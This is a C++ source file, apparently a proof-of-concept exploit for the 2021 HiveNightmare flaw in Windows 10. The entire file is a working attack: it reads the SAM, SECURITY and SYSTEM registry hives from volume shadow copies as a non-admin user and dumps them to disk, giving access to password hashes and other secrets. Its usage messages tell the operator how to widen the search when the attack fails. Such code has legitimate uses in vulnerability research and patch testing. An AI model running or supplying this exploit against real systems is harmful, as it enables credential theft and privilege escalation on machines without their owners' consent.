// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users

// History
// 0.1 - 20/07/2021 - Initial version
// 0.2 - 20/07/2021 - Adds support for 4 snapshots
// 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
// 
// Bugs and issues
// - Dunno

#include <windows.h>
#include <stdio.h>
#include <iostream>

using std::endl;
using std::cout;

HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
    HANDLE hfile;
    wchar_t base[] = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";

    for (int i = 1; i <= maxSearch; i++) {
        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, MAX_PATH, L"%s%d\\%s", base, i, path);

        hfile = CreateFile(fullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hfile != INVALID_HANDLE_VALUE) {
            return hfile;
        }

    }

    return INVALID_HANDLE_VALUE;
}

void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];
    hAppend = CreateFile(dest, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write %ls - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n", dest);
        return;
    }

    while (ReadFile(handle, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    CloseHandle(hAppend);
}

int main(int argc, char* argv[])
{
    int searchDepth;
    if (argc > 1) {
        if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
            printf("\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n");
            return -1;
        }
    }
    else {
        searchDepth = 4;
    }

    printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");

    HANDLE hFile;

    TCHAR samLocation[] = L"Windows\\System32\\config\\SAM";
    TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
    TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";

    hFile = getVssFileHandle(samLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
        return -1;
    }
    else {
        dumpHandleToFile(hFile, (wchar_t*)L"SAM-haxx");
        CloseHandle(hFile);
        cout << "SAM hive written out to current working directory" << endl;
    }
    

    hFile = getVssFileHandle(securityLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
        return -1;
    }
    else {
        dumpHandleToFile(hFile, (wchar_t*)L"SECURITY-haxx");
        CloseHandle(hFile);
        cout << "SECURITY hive written out to current working directory" << endl;
    }
    

    hFile = getVssFileHandle(systemLocation, searchDepth);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
        return -1;
    }
    else {
        dumpHandleToFile(hFile, (wchar_t*)L"SYSTEM-haxx");
        CloseHandle(hFile);
        cout << "SYSTEM hive written out to current working directory" << endl;
    }

    cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx" << endl;

    return 0;
}
